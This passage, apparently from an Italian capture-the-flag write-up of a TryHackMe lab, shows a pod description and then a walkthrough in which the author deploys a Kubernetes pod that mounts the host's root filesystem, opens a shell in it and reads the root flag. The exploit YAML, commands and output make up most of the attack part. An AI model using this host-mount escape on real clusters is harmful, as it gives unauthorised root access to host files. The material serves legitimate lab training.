  creationTimestamp: "2021-10-27T19:48:23Z"
  generateName: nginx-deployment-7b548976fd-
  labels:
    app: nginx
    pod-template-hash: 7b548976fd
  name: nginx-deployment-7b548976fd-77v4r
  namespace: default
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: nginx-deployment-7b548976fd
    uid: 3e23e71f-b91a-41de-a65a-e50629eb51ec
  resourceVersion: "1811281"
  selfLink: /api/v1/namespaces/default/pods/nginx-deployment-7b548976fd-77v4r
  uid: 29879983-7b7f-4143-a8b9-1eb34951fd6d
spec:
  containers:
  - image: localhost:32000/bsnginx
    imagePullPolicy: Always
    name: nginx
    ports:
    - containerPort: 80
      protocol: TCP
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /usr/share/nginx/html
      name: local-stuff
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-hc88j
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: dev-01
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - hostPath:
      path: /home/frank/repos/dk-ml/assets
      type: ""
    name: local-stuff
  - name: kube-api-access-hc88j
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2021-10-27T19:48:23Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2025-11-14T10:12:12Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2025-11-14T10:12:12Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2021-10-27T19:48:23Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://6df5544794214fe8e8178c9f966b5fa8bdac0820e6cef1e2af1584e63c5c2494
    image: localhost:32000/bsnginx:latest
    imageID: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
    lastState:
      terminated:
        containerID: containerd://a56f86268143a36ec7c2c06cd92ea57e2014e5a692e22f592865985c841243a0
        exitCode: 255
        finishedAt: "2021-10-29T12:09:13Z"
        reason: Unknown
        startedAt: "2021-10-29T02:17:45Z"
    name: nginx
    ready: true
    restartCount: 2
    started: true
    state:
      running:
        startedAt: "2025-11-14T10:12:10Z"
  hostIP: 10.10.88.240
  phase: Running
  podIP: 10.1.133.236
  podIPs:
  - ip: 10.1.133.236
  qosClass: BestEffort
  startTime: "2021-10-27T19:48:23Z"

```
L'output ha rivelato che il pod utilizza l'immagine **localhost:32000/bsnginx**.
quindi modifichiamo il Poc

```
nano exploit.yaml
```
```
apiVersion: v1
kind: Pod
metadata:
  name: hostmount
spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /opt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```
Questo file viene quindi applicato al cluster con il comando:
```
microk8s kubectl apply -f exploit.yaml
```
```
frank@dev-01:~$ microk8s kubectl apply -f exploit.yaml
pod/hostmount created
```

si crea una sessione shell all’interno del nuovo container per accedere al filesystem dell'host:
```
microk8s kubectl exec -it hostmount /bin/bash
```

```
ls /opt/root/root
```
```
root@hostmount:/# ls /opt/root/root
root.txt  snap
```

```
cat /opt/root/root/root.txt
```
```
root@hostmount:/# cat /opt/root/root/root.txt
THM{xxxxxxxxxx}
```

